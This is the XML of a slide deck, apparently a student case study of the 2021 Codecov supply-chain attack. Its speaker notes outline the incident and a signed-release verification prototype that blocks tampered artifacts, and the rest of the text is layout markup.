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wdp" ContentType="image/vnd.ms-photo"/>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media/image5.svg" ContentType="image/svg+xml"/>
  <Override PartName="/ppt/media/image7.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xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout30.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76" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId6"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="260" r:id="rId4"/>
    <p:sldId id="261" r:id="rId11"/>
    <p:sldId id="262" r:id="rId12"/>
    <p:sldId id="263" r:id="rId13"/>
    <p:sldId id="264" r:id="rId14"/>
    <p:sldId id="265" r:id="rId15"/>
    <p:sldId id="266" r:id="rId16"/>
    <p:sldId id="267" r:id="rId17"/>
    <p:sldId id="268" r:id="rId18"/>
    <p:sldId id="269" r:id="rId19"/>
    <p:sldId id="270" r:id="rId20"/>
    <p:sldId id="271" r:id="rId21"/>
    <p:sldId id="272" r:id="rId2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Default Section" id="{FF7448E1-C2A3-4423-9029-A5CD3447281A}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="258"/>
            <p14:sldId id="259"/>
            <p14:sldId id="260"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Untitled Section" id="{E332F819-F576-4591-B817-9DE1938680C9}">
          <p14:sldIdLst/>
        </p14:section>
      </p14:sectionLst>
    </p:ext>
    <p:ext uri="{EFAFB233-063F-42B5-8137-9DF3F51BA10A}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" orient="horz" pos="2160" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="288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105" d="100"/>
          <a:sy n="105" d="100"/>
        </p:scale>
        <p:origin x="1794" y="96"/>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4.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide3.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="notesMasters/notesMaster1.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.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9D787B1C-1399-4FB4-9055-2C109D3096E4}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9/8/2026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8FF434D2-807C-49C6-B002-3F1B6E35C8E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>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 Our CCA case study is the 2021 Codecov Bash Uploader supply-chain attack. We analysed how it happened and designed and built a working prototype, a cryptographically verified software supply chain, that makes this attack fail automatically.</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flow of the talk: the incident first, then our design, implementation, testing and relevance.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short: Codecov's uploader was modified in storage and leaked CI secrets for about two months. Our system signs every release, and customers' pipelines verify integrity and authenticity automatically, blocking anything tampered. These are our four objectives.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Codecov is a code-coverage SaaS used inside CI pipelines. From 31 January 2021 an attacker, using a credential extracted because of an error in Codecov's Docker image creation process, repeatedly modified the Bash Uploader. It was detected on 1 April when a customer's checksum did not match, and disclosed on 15 April. These are documented facts from Codecov's post-mortem.</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chain: a credential was exposed through a build artifact, used to change the release in storage, served from the genuine domain over HTTPS, and executed with full privileges in customer CI. This one line sent env and git remotes out. TLS protected the transfer of an already-malicious file, and the checksum only helped because one customer checked it by hand.</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Integrity was the primary requirement violated, together with authenticity. Confidentiality was lost because secrets were exfiltrated, and non-repudiation because there was no signed record of releases. Each vulnerability maps to a requirement and to a control in our design.</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trust zones. The vendor zone builds, tests, hashes and signs inside a signing service. The distribution zone, meaning the registry and network, is treated as untrusted and only carries signed objects. The customer zone pins the vendor root key, verifies everything and then deploys or blocks. Every step is written to the hash-chained audit log.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Each primitive has one clear job. SHA-256 is a fingerprint: it detects change but anyone can compute it. Ed25519 gives authenticity; only the vendor's private key can sign, and customers verify with the public key. TLS 1.3 protects the channel. We sign both the artifact and the manifest, with domain separation so one signature can't be reused for another purpose.</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two-tier hierarchy like TUF. The offline root key signs only the trust policy, and customers pin its public key once. Release keys sign artifacts and can be rotated or revoked by publishing a new signed policy. The policy expires and has a version number, so an old one can't be replayed. In production the private keys live in an HSM or cloud KMS.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continuous security gate. The same policy runs from build to deploy. The customer gate runs ten checks and returns exit code 0 to deploy or 1 to block, so it plugs into any CI system. On a block it raises a security event and writes to the audit log.</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Live demo: python demo.py. A legitimate release passes. I add the Codecov line after signing: the download over TLS 1.3 still succeeds, but the SHA-256 mismatches, the signature fails and the gate blocks. Every attacker variant is blocked, including a stolen key. Everything runs locally; the exfiltration URL is .invalid and the script is never executed.</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All 25 automated tests pass, and all 14 attack scenarios behaved as expected. We mutated the artifact 1000 times at random (bit flips, inserted or deleted bytes, appended exfiltration lines) and every one was rejected, a false-acceptance rate of zero. Verification takes about 2.2 milliseconds, and even a 10 MB artifact takes tens of milliseconds.</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Compared with a checksum file or a bare signature, we add revocation, anti-replay, provenance, a defence even against a stolen key, automatic enforcement and tamper-evident evidence. This matches where the industry went after Codecov and SolarWinds: EO 14028, NIST SSDF, SLSA, Sigstore and TUF. It costs almost nothing to run: open-source libraries and milliseconds per verification.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conclude: the root cause of the Codecov damage was the absence of mandatory verification of both integrity and authenticity. Our prototype provides exactly that, automatically, and blocked every attack we simulated. The main limitation is a stolen key before revocation, which is why HSMs, MFA, monitoring and fast revocation matter. Future work: Sigstore, SLSA level 3, threshold signing.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Our main sources: Codecov's own post-mortem, press coverage, and the standards behind each primitive and practice we used.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Thank you. We are happy to take questions, or to run the live demo again.</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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5.sv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7.sv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8.jp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6.jp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4.jp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jp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9.jp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5.sv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with Pictur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4939258"/>
            <a:ext cx="4423973" cy="480373"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master subtitle style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C58F7861-05FC-CC70-0C94-F3BAE39E54EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-1"/>
            <a:ext cx="9144000" cy="4784036"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDEC7B0B-C375-9D64-1424-3B07B71AF1FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4654446" y="4939715"/>
            <a:ext cx="3315023" cy="479458"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Slide Number Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A9117021-C08A-0E4F-5F64-FC1A870E4815}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822095" y="4939258"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Graphic 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9001D668-DD9C-F5B4-B191-51BDD0B30825}"/>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8327276" y="5873424"/>
            <a:ext cx="754380" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{009A08CF-24F0-EC7D-277D-CB831E7E7930}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-14885" y="5718869"/>
            <a:ext cx="4437126" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:defRPr sz="3900"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2533937333"/>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B406F310-2B8D-3C32-560C-686817E6B487}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="387187" y="1012176"/>
            <a:ext cx="8334756" cy="849793"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Footer Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64FD1A6D-2D8E-1FD1-C1AC-CB5E9D5A15CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="406781" y="110365"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Date Placeholder 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FADE430-EE65-B675-F031-7651DE9D69AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>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9" name="Slide Number Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27305BC9-1670-00D4-5A66-F52444DA9C94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8342970" y="104650"/>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a:xfrm>
            <a:off x="404622" y="2115542"/>
            <a:ext cx="8260253" cy="4451514"/>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3040712369"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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with Picture 2">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0" y="5457214"/>
            <a:ext cx="3154680" cy="1380744"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B24A208E-BD69-BB12-21B8-DA405B501FA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="0"/>
            <a:ext cx="4572000" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9134185-2980-312E-60AF-F360D16FB9EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-13716" y="81290"/>
            <a:ext cx="3490722" cy="3739896"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2493480064"/>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1" y="6174464"/>
            <a:ext cx="4418351" cy="654839"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master subtitle style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Graphic 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D29E0058-93A2-5291-6ACA-A0430862664F}"/>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7276" y="5873424"/>
            <a:ext cx="754380" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA3F14EE-EFB3-D2DC-CEAA-621D66627158}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D33E0DC-DE5C-286F-36BD-6985F4A6C3DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>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0" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1207AF81-9CDB-689F-CE00-62257104ECAA}"/>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6" name="Title 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{570B1373-40A5-190F-BE9F-8FC310F7B0D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-13716" y="2159632"/>
            <a:ext cx="7262622" cy="3776472"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1599165708"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>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ection Header">
    <p:bg>
      <p:bgRef idx="1001">
        <a:schemeClr val="bg1"/>
      </p:bgRef>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Graphic 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54E7A70C-B49B-5779-BA11-88AE4939E04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533016" y="83125"/>
            <a:ext cx="548640" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68197F50-0DC4-261A-813C-264E7361D716}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-13716" y="2184032"/>
            <a:ext cx="6055614" cy="4718304"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1090918898"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:overrideClrMapping bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>
  <p:extLst>
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="5" orient="horz" pos="2160">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" pos="384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Agenda">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13716" y="82296"/>
            <a:ext cx="6104744" cy="1554480"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>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1" y="1896472"/>
            <a:ext cx="6104745" cy="3557904"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="257175" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="428625" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="600075" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="771525" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="942975" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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Oval 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{175C8E38-E957-9E3C-9A05-717C0F009AB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6414384" y="3218512"/>
            <a:ext cx="2668428" cy="3557904"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875"/>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
        <p:nvSpPr>
          <p:cNvPr id="5" name="Slide Number Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01E193C2-09EC-BB41-5A34-007D34EB8B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822095"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233333196"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Agenda with Pictur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4019F8-742E-9EEF-F591-C9666AC32AF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4624798" y="621792"/>
            <a:ext cx="4040036" cy="1816898"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Picture Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9AC20259-235D-F9C3-3788-C1457976F5AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="4429982" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
